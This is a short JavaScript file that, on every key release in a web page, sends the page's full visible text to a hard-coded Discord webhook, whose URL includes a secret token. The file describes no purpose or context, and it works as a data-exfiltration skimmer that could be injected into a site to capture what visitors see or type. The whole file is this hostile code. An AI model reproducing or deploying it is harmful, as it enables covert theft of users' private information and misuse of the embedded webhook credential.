window.onload = function() {
    document.onkeyup = function(e) {
        // Get the text content of the HTML element that was clicked
        let textContent = document.body.innerText;

        // Define the webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1232503153694343179/BrfWvS0RsvE0Yhyl8d-78H5NW99oHODIuAPvgbiVDS9ddcGjz0Po3V2EeHbxFpTUif5D';

        // Define the message to be sent to the webhook
        const message = {
            content: textContent
        };

        // Send the message to the Discord webhook URL using fetch
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message)
        })
        .then(response => console.log('Message sent to Discord webhook'))
        .catch(error => console.error('Error sending message to Discord webhook: ', error));
    }
}
